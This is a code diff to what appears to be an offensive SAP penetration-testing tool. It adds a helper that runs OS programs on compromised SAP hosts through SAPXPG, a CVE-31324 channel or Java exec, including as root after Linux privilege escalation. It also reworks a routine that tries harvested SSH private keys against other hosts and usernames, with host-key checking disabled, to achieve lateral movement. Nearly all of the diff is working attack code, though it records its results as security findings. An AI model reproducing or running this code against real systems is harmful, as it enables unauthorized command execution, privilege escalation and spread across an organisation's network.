@@ -119,9 +119,13 @@ def _make_exec_fn(node: SAPNode, channel: str = "auto"):
                         pass
             return None
 
+        def _run_program_root(prog: str, args: str) -> str:
+            return _run_cmd_root(f"{prog} {args}")
+
         _run_cmd_root._read_b64_chunk = _read_b64_chunk_root
         _run_cmd_root._run_py = _run_py_root
         _run_cmd_root._read_file_full = _read_file_full_root
+        _run_cmd_root._run_program = _run_program_root
         label = ("Linux LPE → root ("
                  + (getattr(node, "linux_lpe_method", "") or "auto") + ")")
         return _run_cmd_root, label
@@ -223,6 +227,37 @@ def _make_exec_fn(node: SAPNode, channel: str = "auto"):
             logger.debug(f"ssh_lateral b64 chunk: {format_rfc_exception(e)}")
         return ""
 
+    def _run_program(prog: str, args: str) -> str:
+        """Run a program directly via SAPXPG — no /bin/sh wrapper.
+        SAPXPG splits args on spaces into argv entries, which is
+        correct for programs like ssh that expect separate arguments."""
+        try:
+            if channel == "sxpg":
+                from sapmap_rfc import execute_local_command
+                creds = node.best_credentials()
+                if not creds:
+                    return ""
+                r = execute_local_command(node, prog, args, creds)
+            elif channel == "cve31324" or (channel == "auto" and "JAVA" in system_type):
+                if "JAVA" in system_type:
+                    run_fn, _, err = _build_java_os_exec(node)
+                    if run_fn is None:
+                        return ""
+                    r = run_fn(prog, args)
+                else:
+                    r = run_os_command(node, prog, args)
+            else:
+                r = run_os_command(node, prog, args)
+
+            if r and r.get("success"):
+                lines = r.get("output") or []
+                if isinstance(lines, list):
+                    return "\n".join(str(x) for x in lines)
+                return str(lines)
+        except Exception as e:
+            logger.debug(f"ssh_lateral _run_program: {format_rfc_exception(e)}")
+        return ""
+
     can_run = False
     label = ""
     if channel == "sxpg":
@@ -262,6 +297,7 @@ def _make_exec_fn(node: SAPNode, channel: str = "auto"):
 
     _run_cmd._read_b64_chunk = _read_b64_chunk
     _run_cmd._run_py = _run_py
+    _run_cmd._run_program = _run_program
     return _run_cmd, label
 
 
@@ -755,6 +791,9 @@ def ssh_test_keys(node: SAPNode, state: SAPMAPState,
     print(f"[*] {sid}: ssh_test_keys — {len(keys)} key(s) × "
           f"{len(targets)} target(s) × {len(sap_usernames)} user(s) "
           f"= {len(keys) * len(targets) * len(sap_usernames)} combos")
+    print(f"  [*] targets: {', '.join(targets)}")
+    print(f"  [*] usernames: {', '.join(sorted(sap_usernames))}")
+    _run_prog = getattr(exec_fn, "_run_program", None)
 
     tested = 0
     successful = []
@@ -769,74 +808,92 @@ def ssh_test_keys(node: SAPNode, state: SAPMAPState,
             sap_usernames - {key_owner})
 
         for target in targets:
+            if _is_stopped():
+                break
             if target in failed and len(failed) > 10:
                 continue
 
             for username in usernames_to_try:
                 tested += 1
-                ssh_cmd = (
-                    f"ssh -o BatchMode=yes "
+                # Call ssh directly (no /bin/sh wrapper) — SAPXPG
+                # splits PARAMS on spaces, creating correct argv
+                # entries for ssh.  The /bin/sh -c wrapping breaks
+                # because nested quotes get mangled.
+                ssh_args = (
+                    f"-o BatchMode=yes "
                     f"-o StrictHostKeyChecking=no "
                     f"-o UserKnownHostsFile=/dev/null "
                     f"-o ConnectTimeout={timeout} "
                     f"-o LogLevel=ERROR "
                     f"-i {key_path} "
                     f"{username}@{target} "
-                    f"'echo SSH_OK; whoami; hostname; uname -a' "
-                    f"2>/dev/null"
+                    f"echo SSH_OK; whoami; hostname; uname -a"
                 )
-                out = exec_fn(ssh_cmd)
-
-                if "SSH_OK" in out:
-                    lines = out.strip().splitlines()
-                    ssh_ok_idx = next(
-                        (i for i, l in enumerate(lines)
-                         if "SSH_OK" in l), -1)
-                    remote_user = (lines[ssh_ok_idx + 1].strip()
-                                   if ssh_ok_idx + 1 < len(lines)
-                                   else "?")
-                    remote_host = (lines[ssh_ok_idx + 2].strip()
-                                   if ssh_ok_idx + 2 < len(lines)
-                                   else "?")
-                    remote_uname = (lines[ssh_ok_idx + 3].strip()
-                                    if ssh_ok_idx + 3 < len(lines)
-                                    else "?")
-
-                    entry = {
-                        "target": target,
-                        "username": username,
-                        "remote_user": remote_user,
-                        "remote_hostname": remote_host,
-                        "remote_uname": remote_uname,
-                        "key_owner": key_owner,
-                        "key_path": key_path,
-                        "key_type": key["type"],
-                        "from_sid": sid,
-                    }
-                    successful.append(entry)
-
-                    print(f"  [+] SSH ACCESS: {key_owner}@{sid} → "
-                          f"{username}@{target} "
-                          f"(key={key['type']}, remote={remote_user}"
-                          f"@{remote_host})")
-
-                    emit_finding(
-                        "CRITICAL", sid,
-                        f"SSH lateral movement: {key_owner}'s "
-                        f"{key['type']} key on {sid} grants access "
-                        f"to {username}@{target} "
-                        f"(remote user={remote_user}, "
-                        f"host={remote_host}). "
-                        f"Generic/shared OS accounts enable "
-                        f"cross-system access without SAP "
-                        f"credentials.",
-                        ref="ssh.lateral.key_accepted",
-                        attack_capability="lateral.ssh_key_reuse",
-                        meta=entry)
-
-                    break
+                if _run_prog:
+                    out = _run_prog("ssh", ssh_args)
                 else:
+                    out = exec_fn(
+                        f"ssh {ssh_args} 2>/dev/null")
+                if not out or "SSH_OK" not in out:
+                    snippet = (out or "").strip()[:120]
+                    if snippet:
+                        logger.debug(f"ssh {username}@{target}: "
+                                     f"{snippet!r}")
+                    else:
+                        print(f"  [-] ssh {username}@{target} "
+                              f"({key_owner}:{key['type']}): "
+                              f"no output (rejected or unreachable)")
                     failed.add(target)
+                    continue
+
+                # SSH_OK found — successful login
+                lines = out.strip().splitlines()
+                ssh_ok_idx = next(
+                    (i for i, l in enumerate(lines)
+                     if "SSH_OK" in l), -1)
+                remote_user = (lines[ssh_ok_idx + 1].strip()
+                               if ssh_ok_idx + 1 < len(lines)
+                               else "?")
+                remote_host = (lines[ssh_ok_idx + 2].strip()
+                               if ssh_ok_idx + 2 < len(lines)
+                               else "?")
+                remote_uname = (lines[ssh_ok_idx + 3].strip()
+                                if ssh_ok_idx + 3 < len(lines)
+                                else "?")
+
+                entry = {
+                    "target": target,
+                    "username": username,
+                    "remote_user": remote_user,
+                    "remote_hostname": remote_host,
+                    "remote_uname": remote_uname,
+                    "key_owner": key_owner,
+                    "key_path": key_path,
+                    "key_type": key["type"],
+                    "from_sid": sid,
+                }
+                successful.append(entry)
+
+                print(f"  [+] SSH ACCESS: {key_owner}@{sid} → "
+                      f"{username}@{target} "
+                      f"(key={key['type']}, remote={remote_user}"
+                      f"@{remote_host})")
+
+                emit_finding(
+                    "CRITICAL", sid,
+                    f"SSH lateral movement: {key_owner}'s "
+                    f"{key['type']} key on {sid} grants access "
+                    f"to {username}@{target} "
+                    f"(remote user={remote_user}, "
+                    f"host={remote_host}). "
+                    f"Generic/shared OS accounts enable "
+                    f"cross-system access without SAP "
+                    f"credentials.",
+                    ref="ssh.lateral.key_accepted",
+                    attack_capability="lateral.ssh_key_reuse",
+                    meta=entry)
+
+                break
 
         if tested % 50 == 0 and tested > 0:
             elapsed = time.time() - started
